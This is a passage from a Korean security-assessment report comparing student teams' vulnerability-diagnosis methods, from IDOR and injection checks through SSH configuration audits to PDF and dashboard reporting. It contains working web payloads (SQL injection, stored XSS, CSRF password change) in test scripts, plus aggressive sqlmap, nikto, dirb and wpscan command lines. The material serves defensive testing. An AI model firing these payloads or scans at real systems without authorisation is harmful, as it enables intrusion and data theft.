    driver.find_element(By.NAME, "password").send_keys("password_a")
    driver.find_element(By.NAME, "submit").click()

    # 사용자 A의 시험 ID 확인
    driver.get("http://target.com/my_exam")
    user_a_exam_id = driver.find_element(By.ID, "exam_id").text  # 예: 1001

    # 사용자 B로 로그인
    driver.delete_all_cookies()
    driver.get("http://target.com/login")
    driver.find_element(By.NAME, "username").send_keys("user_b")
    driver.find_element(By.NAME, "password").send_keys("password_b")
    driver.find_element(By.NAME, "submit").click()

    # 사용자 A의 시험 정보에 접근 시도 (IDOR)
    driver.get(f"http://target.com/exam_detail?id={user_a_exam_id}")

    # 접근 성공 여부 확인
    if "403 Forbidden" not in driver.page_source and "Access Denied" not in driver.page_source:
        print(f"[취약] IDOR 취약점 발견: 사용자 B가 사용자 A의 시험 정보에 접근 가능")
        return {
            "vulnerability": "IDOR",
            "description": "타인의 시험 정보 조회 가능",
            "url": f"http://target.com/exam_detail?id={user_a_exam_id}",
            "severity": "HIGH"
        }
    else:
        print("[양호] IDOR 취약점 없음: 접근 제어 정상")
        return None

    driver.quit()
```

#### (3) 그레이박스 (화이트박스 + 블랙박스 통합)

**대표 팀**: 7조, 1조, 4조

**접근 방식**:
- 코드 분석 + 동적 테스트 병행
- SAST + DAST 통합
- 코드에서 의심 지점 식별 후 동적 테스트로 검증

**장점**:
- False Positive 최소화
- 근본 원인 + 실제 영향 동시 파악
- 가장 정확한 진단 가능

**단점**:
- 시간과 리소스 많이 소요
- 두 가지 접근 방식 모두 숙련 필요

**7조 사례 (Stryker AI SAST + DAST)**:
```python
# 그레이박스 진단 - SAST 결과를 DAST로 검증

# STEP 1: SAST (Stryker AI)로 의심 지점 식별
sast_results = stryker_scan("./src")
# SAST 결과: user_controller.py:67에서 SQL Injection 의심

# STEP 2: 해당 코드 확인 (화이트박스)
# user_controller.py:67
# query = f"SELECT * FROM lms_users WHERE email = '{email}'"

# STEP 3: DAST로 실제 취약점 검증 (블랙박스)
import requests

def verify_sql_injection(url, param):
    # 타임베이스 블라인드 SQL Injection 테스트
    payload1 = "test@test.com' AND SLEEP(5)--"
    payload2 = "test@test.com"

    # 페이로드 1 (SLEEP)
    start_time1 = time.time()
    requests.get(url, params={param: payload1})
    elapsed_time1 = time.time() - start_time1

    # 페이로드 2 (정상)
    start_time2 = time.time()
    requests.get(url, params={param: payload2})
    elapsed_time2 = time.time() - start_time2

    # 시간 차이가 5초 이상이면 취약
    if elapsed_time1 - elapsed_time2 >= 4.5:
        return {
            "result": "VULNERABLE",
            "sast_location": "user_controller.py:67",
            "dast_confirmed": True,
            "evidence": f"Response time with SLEEP: {elapsed_time1}s, Normal: {elapsed_time2}s"
        }
    else:
        return {
            "result": "FALSE_POSITIVE",
            "sast_location": "user_controller.py:67",
            "dast_confirmed": False,
            "note": "SAST에서 의심했으나 실제 취약하지 않음 (또는 WAF 차단)"
        }

# 실행
result = verify_sql_injection("http://lms.com/api/user", "email")
print(result)
```

**1조 사례 (AI 분석 + 동적 테스트)**:
```python
# 그레이박스 진단 - AI가 코드 분석 후 자동으로 테스트 케이스 생성

# STEP 1: AI가 코드 분석
def analyze_code_with_ai(code_snippet):
    prompt = f"""
    다음 코드를 분석하여 보안 취약점을 찾아주세요:

    {code_snippet}

    취약점 유형, 위치, 공격 페이로드를 JSON 형식으로 반환해주세요.
    """

    response = claude_api.complete(prompt=prompt)
    return json.loads(response)

# STEP 2: AI 분석 결과
ai_result = analyze_code_with_ai("""
@app.route('/search')
def search():
    keyword = request.args.get('q')
    query = f"SELECT * FROM products WHERE name LIKE '%{keyword}%'"
    results = db.execute(query)
    return render_template('search.html', results=results)
""")

# AI 분석 결과:
# {
#     "vulnerability": "SQL Injection",
#     "location": "search route, line 4",
#     "attack_payloads": [
#         "test%' OR '1'='1",
#         "test%' UNION SELECT username, password FROM users--"
#     ]
# }

# STEP 3: AI가 제안한 페이로드로 자동 테스트
def auto_test_vulnerability(url, param, payloads):
    results = []
    for payload in payloads:
        response = requests.get(url, params={param: payload})

        # 취약점 탐지 로직
        if "syntax error" in response.text.lower() or \
           len(response.text) > 10000 or \
           "username" in response.text.lower():
            results.append({
                "payload": payload,
                "result": "VULNERABLE",
                "response_length": len(response.text)
            })
        else:
            results.append({
                "payload": payload,
                "result": "NOT_VULNERABLE"
            })

    return results

# 실행
test_results = auto_test_vulnerability(
    "http://target.com/search",
    "q",
    ai_result["attack_payloads"]
)
```

#### (4) 인프라 중심 (OS/네트워크/설정 진단)

**대표 팀**: 9조, 8조, 1조

**접근 방식**:
- SSH 접속을 통한 서버 설정 점검
- OS 레벨 취약점 진단
- 네트워크 포트 스캔
- 파일 권한 및 계정 관리 점검

**장점**:
- 시스템 레벨 취약점 발견
- 설정 오류 탐지
- 실제 침해 사고 원인 파악 가능

**단점**:
- 애플리케이션 로직 취약점 발견 어려움
- SSH 접근 권한 필요

**9조 사례 (SSH 기반 OS 진단)**:
```python
# 인프라 진단 - SSH를 통한 서버 설정 점검

import paramiko

def check_root_remote_login(host, username, key_file):
    """루트 원격 접속 취약점 점검"""

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(host, username=username, key_filename=key_file)

    # sshd_config 파일 읽기
    stdin, stdout, stderr = client.exec_command("cat /etc/ssh/sshd_config")
    sshd_config = stdout.read().decode()

    # PermitRootLogin 설정 확인
    for line in sshd_config.split('\n'):
        line = line.strip()

        # 주석이 아니고 PermitRootLogin 설정이 있는 경우
        if not line.startswith('#') and 'PermitRootLogin' in line:
            if 'yes' in line.lower():
                return {
                    "item": "루트 원격 접속 취약점",
                    "result": "FAIL",
                    "severity": "HIGH",
                    "evidence": line,
                    "description": "루트 계정의 원격 접속이 허용되어 있습니다.",
                    "recommendation": "PermitRootLogin no 설정 권장"
                }
            else:
                return {
                    "item": "루트 원격 접속 취약점",
                    "result": "PASS",
                    "evidence": line
                }

    # 설정이 없으면 기본값(주석처리)은 허용이므로 취약
    return {
        "item": "루트 원격 접속 취약점",
        "result": "FAIL",
        "severity": "HIGH",
        "evidence": "PermitRootLogin 설정 없음 (기본값: yes)",
        "description": "루트 원격 접속 설정이 명시되지 않아 기본적으로 허용됩니다.",
        "recommendation": "PermitRootLogin no 설정 권장"
    }

def check_suid_sgid_files(host, username, key_file):
    """SUID/SGID 파일 점검"""

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(host, username=username, key_filename=key_file)

    # SUID 파일 검색
    stdin, stdout, stderr = client.exec_command("find / -perm -4000 -type f 2>/dev/null")
    suid_files = stdout.read().decode().strip().split('\n')

    # SGID 파일 검색
    stdin, stdout, stderr = client.exec_command("find / -perm -2000 -type f 2>/dev/null")
    sgid_files = stdout.read().decode().strip().split('\n')

    # 위험한 SUID/SGID 파일 목록
    dangerous_files = [
        '/usr/bin/nmap', '/usr/bin/vim', '/usr/bin/find',
        '/usr/bin/perl', '/usr/bin/python', '/usr/bin/gcc'
    ]

    vulnerable_files = []
    for file in suid_files + sgid_files:
        if any(dangerous in file for dangerous in dangerous_files):
            vulnerable_files.append(file)

    if vulnerable_files:
        return {
            "item": "SUID/SGID 파일 점검",
            "result": "FAIL",
            "severity": "HIGH",
            "evidence": f"발견된 위험 파일: {', '.join(vulnerable_files)}",
            "description": f"권한 상승에 악용 가능한 SUID/SGID 파일 {len(vulnerable_files)}개 발견",
            "recommendation": "불필요한 SUID/SGID 권한 제거 (chmod u-s, chmod g-s)"
        }
    else:
        return {
            "item": "SUID/SGID 파일 점검",
            "result": "PASS",
            "total_suid": len([f for f in suid_files if f]),
            "total_sgid": len([f for f in sgid_files if f])
        }

# 실행
root_login_result = check_root_remote_login("192.168.1.10", "ubuntu", "key.pem")
suid_result = check_suid_sgid_files("192.168.1.10", "ubuntu", "key.pem")
```

**8조 사례 (SSH 터널링을 통한 Private Subnet 진단)**:
```python
# 인프라 진단 - SSH 터널링으로 Private Subnet 서버 진단

import paramiko
from sshtunnel import SSHTunnelForwarder
import mysql.connector

def diagnose_private_db_via_tunnel(bastion_host, bastion_user, bastion_key,
                                     db_host, db_port, db_user, db_password):
    """Bastion Host를 통한 Private DB 진단"""

    # SSH 터널 생성
    with SSHTunnelForwarder(
        (bastion_host, 22),
        ssh_username=bastion_user,
        ssh_pkey=bastion_key,
        remote_bind_address=(db_host, db_port)
    ) as tunnel:

        # 터널을 통해 DB 연결
        conn = mysql.connector.connect(
            host='127.0.0.1',
            port=tunnel.local_bind_port,
            user=db_user,
            password=db_password
        )

        cursor = conn.cursor()

        # 1. 계정 권한 점검
        cursor.execute("SELECT user, host, Grant_priv, Super_priv FROM mysql.user")
        users = cursor.fetchall()

        vulnerable_users = []
        for user in users:
            username, host, grant_priv, super_priv = user
            if username != 'root' and (grant_priv == 'Y' or super_priv == 'Y'):
                vulnerable_users.append({
                    "username": username,
                    "host": host,
                    "grant_priv": grant_priv,
                    "super_priv": super_priv
                })

        # 2. 패스워드 정책 점검
        cursor.execute("SHOW VARIABLES LIKE 'validate_password%'")
        password_policy = {row[0]: row[1] for row in cursor.fetchall()}

        # 3. 익명 계정 점검
        cursor.execute("SELECT user, host FROM mysql.user WHERE user = ''")
        anonymous_users = cursor.fetchall()

        return {
            "vulnerable_users": vulnerable_users,
            "password_policy": password_policy,
            "anonymous_users": anonymous_users,
            "diagnosis_method": "SSH Tunnel via Bastion Host"
        }

# 실행
result = diagnose_private_db_via_tunnel(
    bastion_host="13.124.xxx.xxx",
    bastion_user="ec2-user",
    bastion_key="/path/to/key.pem",
    db_host="192.168.2.10",
    db_port=3306,
    db_user="admin",
    db_password="password"
)
```

### 7.2.2 진단 프로세스 표준화

10개 팀의 진단 프로세스를 분석한 결과, 공통적으로 다음과 같은 **5단계 프로세스**를 따르고 있음을 확인했습니다.


#### 1단계: 사전 준비 (Pre-Assessment)

**목적**: 진단 범위 정의 및 기준 수립

**주요 활동**:
1. 진단 대상 시스템 선정
2. 진단 기준 선택 (OWASP Top 10, KISA 가이드 등)
3. 진단 도구 및 환경 준비
4. 진단 일정 수립

**9조 사례**:
```
- 진단 대상: 병원 웹사이트 (Tomcat 9 + MariaDB + Nginx)
- 진단 기준: KISA 주요정보통신기반시설 취약점 진단 가이드 (130개 항목)
- 진단 도구: Python SSH 기반 스크립트, PDF 리포트 생성기
- 진단 범위: 웹 서버, WAS, DB 서버, OS (4개 영역)
- 진단 일정: 2주 (설정 점검 1주, 동적 진단 1주)
```

**7조 사례**:
```
- 진단 대상: LMS 플러그인 시스템
- 진단 기준: OWASP Top 10 2021 + KISA 67개 항목
- 진단 도구: Stryker AI (SAST/DAST), Streamlit 대시보드
- 진단 범위: 플러그인 업로드, API 인증, 파일 시스템 접근
- 진단 일정: 3주 (SAST 1주, DAST 1주, 통합 분석 1주)
```

#### 2단계: 정보 수집 (Information Gathering)

**목적**: 진단 대상 시스템의 기본 정보 파악

**주요 활동**:
1. 서버 IP, 포트, 도메인 정보 수집
2. OS, 웹 서버, WAS, DB 버전 확인
3. 네트워크 토폴로지 파악
4. 서비스 계정 및 권한 확인

**1조 사례 (자동화된 정보 수집)**:
```python
# 정보 수집 자동화 스크립트

import subprocess
import json

def collect_system_info(target_host):
    """시스템 정보 자동 수집"""

    info = {}

    # 1. OS 정보
    os_info = subprocess.check_output("uname -a", shell=True).decode()
    info['os'] = os_info.strip()

    # 2. 웹 서버 정보
    try:
        web_server = subprocess.check_output("nginx -v 2>&1 || httpd -v 2>&1", shell=True).decode()
        info['web_server'] = web_server.strip()
    except:
        info['web_server'] = "Not found"

    # 3. 데이터베이스 정보
    try:
        db_version = subprocess.check_output("mysql --version 2>&1", shell=True).decode()
        info['database'] = db_version.strip()
    except:
        info['database'] = "Not found"

    # 4. Python 버전
    python_version = subprocess.check_output("python3 --version", shell=True).decode()
    info['python'] = python_version.strip()

    # 5. 열린 포트 확인
    open_ports = subprocess.check_output("ss -tuln | grep LISTEN", shell=True).decode()
    info['open_ports'] = [line.strip() for line in open_ports.split('\n') if line.strip()]

    # 6. 현재 사용자 및 권한
    current_user = subprocess.check_output("whoami", shell=True).decode().strip()
    user_groups = subprocess.check_output(f"groups {current_user}", shell=True).decode().strip()
    info['user'] = current_user
    info['groups'] = user_groups

    return info

# 실행
system_info = collect_system_info("192.168.1.10")
print(json.dumps(system_info, indent=2, ensure_ascii=False))

# 출력 예시:
# {
#   "os": "Linux ip-192-168-1-10 5.10.0-1045-aws #47-Ubuntu SMP",
#   "web_server": "nginx version: nginx/1.18.0 (Ubuntu)",
#   "database": "mysql  Ver 8.0.31 for Linux on x86_64 (MySQL Community Server - GPL)",
#   "python": "Python 3.9.7",
#   "open_ports": [
#     "tcp   LISTEN  0   128   0.0.0.0:22",
#     "tcp   LISTEN  0   128   0.0.0.0:80",
#     "tcp   LISTEN  0   70    127.0.0.1:3306"
#   ],
#   "user": "ubuntu",
#   "groups": "ubuntu : ubuntu adm dialout cdrom floppy sudo audio dip video plugdev netdev lxd"
# }
```

**8조 사례 (XML 기반 서버 정의)**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<diagnosis>
    <bastion>
        <ip>13.124.xxx.xxx</ip>
        <port>22</port>
        <user>ec2-user</user>
        <key>diagnosis-key.pem</key>
    </bastion>

    <servers>
        <server>
            <id>web-01</id>
            <description>웹 서버 (Nginx)</description>
            <category>web</category>
            <private_ip>192.168.1.10</private_ip>
            <os>Ubuntu 20.04</os>
            <services>
                <service>
                    <name>nginx</name>
                    <version>1.18.0</version>
                    <port>80</port>
                </service>
            </services>
        </server>

        <server>
            <id>was-01</id>
            <description>애플리케이션 서버 (Flask)</description>
            <category>application</category>
            <private_ip>192.168.1.20</private_ip>
            <os>Ubuntu 20.04</os>
            <application_path>/opt/app</application_path>
            <services>
                <service>
                    <name>flask</name>
                    <version>2.0.1</version>
                    <port>5000</port>
                </service>
            </services>
        </server>

        <server>
            <id>db-01</id>
            <description>데이터베이스 서버 (MySQL)</description>
            <category>database</category>
            <private_ip>192.168.2.10</private_ip>
            <os>Ubuntu 20.04</os>
            <db_user>admin</db_user>
            <db_password>encrypted_password</db_password>
            <services>
                <service>
                    <name>mysql</name>
                    <version>8.0.31</version>
                    <port>3306</port>
                </service>
            </services>
        </server>
    </servers>
</diagnosis>
```

#### 3단계: 취약점 점검 (Vulnerability Assessment)

**목적**: 실제 취약점 탐지 및 확인

**주요 활동**:
1. 자동화 스크립트 실행
2. 수동 테스트 수행
3. 코드 리뷰 (화이트박스)
4. 페이로드 주입 테스트 (블랙박스)

**10조 사례 (Kali Linux 도구 활용)**:
```bash
# 취약점 점검 - Kali Linux 도구 활용

# 1. Nmap 포트 스캔
nmap -sV -sC -p- -oN nmap_scan.txt 192.168.1.10

# 2. Nikto 웹 취약점 스캔
nikto -h http://192.168.1.10 -output nikto_report.html -Format html

# 3. SQLMap SQL Injection 테스트
sqlmap -u "http://192.168.1.10/course?id=1" \
       --batch \
       --level=5 \
       --risk=3 \
       --output-dir=./sqlmap_results

# 4. dirb 디렉터리 브루트포싱
dirb http://192.168.1.10 /usr/share/wordlists/dirb/common.txt \
     -o dirb_results.txt

# 5. wpscan (WordPress가 있는 경우)
wpscan --url http://192.168.1.10 \
       --enumerate u,p \
       --output wpscan_report.txt

# 모든 결과를 하나의 리포트로 통합
cat nmap_scan.txt nikto_report.html sqlmap_results/* dirb_results.txt wpscan_report.txt > combined_report.txt
```

**5조 사례 (수동 진단으로 스캐너 검증)**:
```python
# 취약점 점검 - 수동 진단으로 자동화 스캐너 결과 검증

# CASE 1: SQL Injection
# 스캐너 결과: "login 페이지에서 SQL Injection 취약점 발견"

# 수동 검증 1: 싱글 쿼트 테스트
import requests

url = "http://target.com/login"
payload_test1 = {"username": "admin'", "password": "test"}
response1 = requests.post(url, data=payload_test1)

if "SQL syntax" in response1.text or "mysql_" in response1.text:
    print("[확인] SQL Injection 취약점 실제 존재 - 에러 메시지 노출")
else:
    print("[재검증 필요] 에러 메시지 없음")

# 수동 검증 2: 타임베이스 블라인드
payload_test2 = {"username": "admin' AND SLEEP(5)--", "password": "test"}
import time
start = time.time()
response2 = requests.post(url, data=payload_test2)
elapsed = time.time() - start

if elapsed >= 5:
    print(f"[확인] Blind SQL Injection 취약점 실제 존재 - 응답 시간: {elapsed}초")
else:
    print(f"[오탐 가능성] 응답 시간: {elapsed}초 (5초 미만)")

# 수동 검증 3: Union-based
payload_test3 = {"username": "admin' UNION SELECT 1,2,3,4,5--", "password": "test"}
response3 = requests.post(url, data=payload_test3)

if "2" in response3.text or "3" in response3.text:
    print("[확인] Union-based SQL Injection 가능 - 데이터 유출 위험")

# CASE 2: XSS
# 스캐너 결과: "게시판에서 Stored XSS 취약점 발견"

# 수동 검증: 실제 XSS 페이로드 주입
xss_payload = "<script>alert('XSS')</script>"
post_data = {
    "title": "테스트 게시글",
    "content": xss_payload
}

# 게시글 작성
create_response = requests.post("http://target.com/board/create", data=post_data)

# 게시글 조회
view_response = requests.get("http://target.com/board/1")

if xss_payload in view_response.text:
    print("[확인] Stored XSS 취약점 실제 존재 - 페이로드가 그대로 출력됨")
    print(f"증거: {xss_payload} 발견")
else:
    print("[오탐] XSS 필터링 또는 이스케이프 처리됨")

# CASE 3: CSRF
# 스캐너 결과: "비밀번호 변경 페이지에서 CSRF 취약점 발견"

# 수동 검증: CSRF 토큰 확인
session = requests.Session()
session.post("http://target.com/login", data={"username": "test", "password": "test123"})

# 비밀번호 변경 페이지 접근
change_pw_page = session.get("http://target.com/change_password")

if "csrf_token" in change_pw_page.text or "csrfToken" in change_pw_page.text:
    print("[오탐] CSRF 토큰 존재 - 취약하지 않음")
else:
    # CSRF 토큰 없이 비밀번호 변경 시도
    malicious_request = requests.post(
        "http://target.com/change_password",
        data={"new_password": "hacked123"},
        cookies=session.cookies
    )

    if malicious_request.status_code == 200 and "success" in malicious_request.text.lower():
        print("[확인] CSRF 취약점 실제 존재 - 토큰 없이 비밀번호 변경 성공")
    else:
        print("[재검증 필요] 요청 실패 또는 다른 보호 메커니즘 존재")

# 검증 결과 요약
verification_summary = {
    "SQL Injection": "CONFIRMED",
    "Stored XSS": "CONFIRMED",
    "CSRF": "FALSE_POSITIVE",
    "total_scanner_findings": 10,
    "confirmed_vulnerabilities": 8,
    "false_positives": 2,
    "accuracy_rate": "80%"
}

print("\n=== 수동 검증 요약 ===")
print(json.dumps(verification_summary, indent=2))
```

#### 4단계: 결과 분석 (Analysis)

**목적**: 발견된 취약점을 분석하고 위험도 평가

**주요 활동**:
1. 취약점 분류 (OWASP Top 10 매핑)
2. 위험도 평가 (CVSS 스코어링)
3. False Positive 제거
4. 근본 원인 분석

**7조 사례 (Streamlit 대시보드로 결과 분석)**:
```python
# 결과 분석 - Streamlit 대시보드

import streamlit as st
import pandas as pd
import plotly.express as px
import json

# 진단 결과 로드
with open('diagnosis_results.json', 'r') as f:
    results = json.load(f)

st.title("LMS 플러그인 보안 진단 결과 대시보드")

# 1. 전체 통계
st.header("1. 전체 통계")
col1, col2, col3, col4 = st.columns(4)

total_items = results['total_items']
vulnerable = results['vulnerable']
safe = results['safe']
info = results['info']

col1.metric("진단 항목", total_items)
col2.metric("취약", vulnerable, delta=f"-{vulnerable}", delta_color="inverse")
col3.metric("양호", safe, delta=f"+{safe}", delta_color="normal")
col4.metric("정보", info)

# 2. 취약점 분포 (원형 차트)
st.header("2. 취약점 분포")

vuln_data = pd.DataFrame({
    '분류': ['취약', '양호', '정보'],
    '개수': [vulnerable, safe, info]
})

fig_pie = px.pie(vuln_data, values='개수', names='분류',
                 color_discrete_map={'취약': 'red', '양호': 'green', '정보': 'blue'})
st.plotly_chart(fig_pie)

# 3. 위험도별 분류
st.header("3. 위험도별 분류")

severity_data = pd.DataFrame(results['severity_breakdown'])
fig_bar = px.bar(severity_data, x='심각도', y='개수', color='심각도',
                 color_discrete_map={'CRITICAL': 'darkred', 'HIGH': 'red',
                                     'MEDIUM': 'orange', 'LOW': 'yellow'})
st.plotly_chart(fig_bar)

# 4. 취약점 유형별 통계
st.header("4. 취약점 유형별 통계")

vuln_types = pd.DataFrame(results['vulnerability_types'])
st.dataframe(vuln_types, use_container_width=True)

# 5. 상세 취약점 목록
st.header("5. 상세 취약점 목록")

for vuln in results['vulnerabilities']:
    with st.expander(f"[{vuln['severity']}] {vuln['title']}"):
        st.write(f"**위치**: {vuln['location']}")
        st.write(f"**설명**: {vuln['description']}")
        st.code(vuln['evidence'], language='python')
        st.write(f"**권장 조치**: {vuln['recommendation']}")

        # CVSS 스코어
        cvss_score = vuln.get('cvss_score', 0)
        st.metric("CVSS 스코어", f"{cvss_score}/10.0")

# 6. OWASP Top 10 매핑
st.header("6. OWASP Top 10 2021 매핑")

owasp_mapping = pd.DataFrame(results['owasp_top10_mapping'])
st.table(owasp_mapping)

# 7. 시간대별 진단 진행 상황
st.header("7. 진단 진행 상황")

timeline_data = pd.DataFrame(results['diagnosis_timeline'])
fig_timeline = px.line(timeline_data, x='timestamp', y='completed_items',
                       title='시간대별 진단 완료 항목 수')
st.plotly_chart(fig_timeline)

# 8. 조치 우선순위
st.header("8. 조치 우선순위")

priority_list = sorted(results['vulnerabilities'],
                       key=lambda x: (x['severity_rank'], x['exploitability']),
                       reverse=True)

for idx, vuln in enumerate(priority_list[:10], 1):
    st.write(f"{idx}. [{vuln['severity']}] {vuln['title']} (악용 가능성: {vuln['exploitability']}%)")

# 9. False Positive 분석
st.header("9. False Positive 분석")

st.write(f"총 {results['total_findings']}개 발견 중 {results['false_positives']}개 오탐 제거")
st.write(f"정확도: {results['accuracy_rate']}%")

fp_reasons = pd.DataFrame(results['false_positive_reasons'])
st.table(fp_reasons)

# 10. 다운로드 버튼
st.header("10. 리포트 다운로드")

if st.button("PDF 리포트 생성"):
    # PDF 생성 로직
    st.success("PDF 리포트가 생성되었습니다!")
    st.download_button("다운로드", data=open('report.pdf', 'rb'), file_name='lms_diagnosis_report.pdf')
```

#### 5단계: 리포트 생성 (Reporting)

**목적**: 진단 결과를 문서화하고 조치 방안 제시

**주요 활동**:
1. 리포트 작성 (PDF, HTML, Markdown 등)
2. 조치 방안 제시 (코드 수정, 설정 변경 등)
3. 재진단 가이드 제공
4. 대시보드 생성 (선택)

**9조 사례 (PDF 리포트)**:
```python
# 리포트 생성 - PDF

from reportlab.lib.pagesizes import A4
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib import colors
from reportlab.pdfbase import pdfmetrics
from reportlab.pdfbase.ttfonts import TTFont
import json

# 한글 폰트 등록
pdfmetrics.registerFont(TTFont('NanumGothic', '/usr/share/fonts/truetype/nanum/NanumGothic.ttf'))

def generate_pdf_report(diagnosis_results, output_file='diagnosis_report.pdf'):
    """진단 결과 PDF 리포트 생성"""

    doc = SimpleDocTemplate(output_file, pagesize=A4)
    story = []
    styles = getSampleStyleSheet()

    # 한글 지원 스타일 정의
    korean_style = ParagraphStyle(
        'Korean',
        parent=styles['Normal'],
        fontName='NanumGothic',
        fontSize=10
    )

    title_style = ParagraphStyle(
        'KoreanTitle',
        parent=styles['Title'],
        fontName='NanumGothic',
        fontSize=20,
        textColor=colors.HexColor('#2C3E50')
    )

    heading_style = ParagraphStyle(
        'KoreanHeading',
        parent=styles['Heading1'],
        fontName='NanumGothic',
        fontSize=14,
        textColor=colors.HexColor('#34495E')
    )

    # 표지
    story.append(Paragraph("병원 웹사이트 보안 진단 리포트", title_style))
    story.append(Spacer(1, 20))
    story.append(Paragraph(f"진단 일시: {diagnosis_results['diagnosis_date']}", korean_style))
    story.append(Paragraph(f"진단 대상: {diagnosis_results['target_system']}", korean_style))
    story.append(Paragraph(f"진단 팀: 화이트 가운 (9조)", korean_style))
    story.append(PageBreak())

    # 목차
    story.append(Paragraph("목차", heading_style))
    story.append(Spacer(1, 10))
    toc_data = [
        ["1.", "진단 개요"],
        ["2.", "진단 결과 요약"],
        ["3.", "취약점 상세 내역"],
        ["4.", "조치 방안"],
        ["5.", "참고 자료"]
    ]
    toc_table = Table(toc_data, colWidths=[30, 400])
    toc_table.setStyle(TableStyle([
        ('FONT', (0, 0), (-1, -1), 'NanumGothic', 10),
        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
        ('VALIGN', (0, 0), (-1, -1), 'MIDDLE'),
        ('GRID', (0, 0), (-1, -1), 0.5, colors.grey)
    ]))
    story.append(toc_table)
    story.append(PageBreak())

    # 1. 진단 개요
    story.append(Paragraph("1. 진단 개요", heading_style))
    story.append(Spacer(1, 10))
    story.append(Paragraph(f"진단 기준: {diagnosis_results['diagnosis_standard']}", korean_style))
    story.append(Paragraph(f"진단 항목: {diagnosis_results['total_items']}개", korean_style))
    story.append(Paragraph(f"진단 영역: 웹 서버, WAS, DB, OS", korean_style))
    story.append(Spacer(1, 20))

    # 2. 진단 결과 요약
    story.append(Paragraph("2. 진단 결과 요약", heading_style))
    story.append(Spacer(1, 10))

    summary_data = [
        ["구분", "항목 수", "비율"],
        ["양호", str(diagnosis_results['safe']), f"{diagnosis_results['safe']/diagnosis_results['total_items']*100:.1f}%"],
        ["취약", str(diagnosis_results['vulnerable']), f"{diagnosis_results['vulnerable']/diagnosis_results['total_items']*100:.1f}%"],
        ["정보", str(diagnosis_results['info']), f"{diagnosis_results['info']/diagnosis_results['total_items']*100:.1f}%"],
        ["합계", str(diagnosis_results['total_items']), "100%"]
    ]

    summary_table = Table(summary_data, colWidths=[150, 100, 100])
    summary_table.setStyle(TableStyle([
        ('FONT', (0, 0), (-1, -1), 'NanumGothic', 10),
        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#3498DB')),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
        ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
        ('VALIGN', (0, 0), (-1, -1), 'MIDDLE'),
        ('GRID', (0, 0), (-1, -1), 1, colors.black),
        ('BACKGROUND', (0, 1), (-1, 1), colors.HexColor('#2ECC71')),  # 양호 - 녹색
        ('BACKGROUND', (0, 2), (-1, 2), colors.HexColor('#E74C3C')),  # 취약 - 빨강
        ('BACKGROUND', (0, 3), (-1, 3), colors.HexColor('#F39C12')),  # 정보 - 주황
    ]))
    story.append(summary_table)
    story.append(PageBreak())

    # 3. 취약점 상세 내역
    story.append(Paragraph("3. 취약점 상세 내역", heading_style))
    story.append(Spacer(1, 10))

    for idx, vuln in enumerate(diagnosis_results['vulnerabilities'], 1):
        # 취약점만 표시 (양호한 항목은 제외)
        if vuln['result'] == 'FAIL':
            story.append(Paragraph(f"3.{idx} {vuln['item']}", korean_style))
            story.append(Spacer(1, 5))

            vuln_detail_data = [
                ["항목", vuln['item']],
                ["결과", "취약"],
                ["위험도", vuln['severity']],
                ["설명", vuln['description']],
                ["증거", vuln['evidence'][:200] + "..." if len(vuln['evidence']) > 200 else vuln['evidence']],
                ["권장 조치", vuln['recommendation']]
            ]

            vuln_detail_table = Table(vuln_detail_data, colWidths=[100, 350])
            vuln_detail_table.setStyle(TableStyle([
                ('FONT', (0, 0), (-1, -1), 'NanumGothic', 9),
                ('BACKGROUND', (0, 0), (0, -1), colors.HexColor('#ECF0F1')),
                ('ALIGN', (0, 0), (0, -1), 'RIGHT'),
                ('VALIGN', (0, 0), (-1, -1), 'TOP'),
                ('GRID', (0, 0), (-1, -1), 0.5, colors.grey)
            ]))
            story.append(vuln_detail_table)
            story.append(Spacer(1, 15))

    story.append(PageBreak())

    # 4. 조치 방안
    story.append(Paragraph("4. 조치 방안", heading_style))
    story.append(Spacer(1, 10))

    for idx, vuln in enumerate(diagnosis_results['vulnerabilities'], 1):
        if vuln['result'] == 'FAIL':
            story.append(Paragraph(f"{idx}. {vuln['item']}", korean_style))
            story.append(Spacer(1, 5))
            story.append(Paragraph(f"조치 방법: {vuln['remediation']}", korean_style))

            if 'remediation_code' in vuln:
                story.append(Spacer(1, 5))
                story.append(Paragraph("수정 코드 예시:", korean_style))
                story.append(Spacer(1, 3))
                code_style = ParagraphStyle(
                    'Code',
                    parent=korean_style,
                    fontName='Courier',
                    fontSize=8,
                    leftIndent=20
                )
                story.append(Paragraph(vuln['remediation_code'], code_style))

            story.append(Spacer(1, 15))

    story.append(PageBreak())

    # 5. 참고 자료
    story.append(Paragraph("5. 참고 자료", heading_style))
    story.append(Spacer(1, 10))

    references = [
        "KISA 주요정보통신기반시설 취약점 진단 가이드",
        "OWASP Top 10 2021",
        "CWE (Common Weakness Enumeration)",
        "CVSS v3.1 (Common Vulnerability Scoring System)"
    ]

    for ref in references:
        story.append(Paragraph(f"• {ref}", korean_style))
        story.append(Spacer(1, 5))

    # PDF 생성
    doc.build(story)
    print(f"PDF 리포트 생성 완료: {output_file}")

# 실행
diagnosis_results = {
    "diagnosis_date": "2026-01-06",
    "target_system": "병원 웹사이트 (Tomcat 9 + MariaDB)",
    "diagnosis_standard": "KISA 주요정보통신기반시설 취약점 진단 가이드",
    "total_items": 130,
    "safe": 80,
    "vulnerable": 50,
    "info": 0,
    "vulnerabilities": [
        {
            "item": "루트 원격 접속 취약점",
            "result": "FAIL",
            "severity": "HIGH",
            "description": "루트 계정의 원격 접속이 허용되어 있습니다.",
            "evidence": "PermitRootLogin yes",
            "recommendation": "PermitRootLogin no 설정 권장",
            "remediation": "/etc/ssh/sshd_config 파일에서 PermitRootLogin no로 변경 후 sshd 재시작",
            "remediation_code": "# /etc/ssh/sshd_config\nPermitRootLogin no\n\n# 서비스 재시작\nsudo systemctl restart sshd"
        },
        # ... 더 많은 취약점
    ]
}

generate_pdf_report(diagnosis_results)
```

### 7.2.3 팀별 리포팅 방식 비교

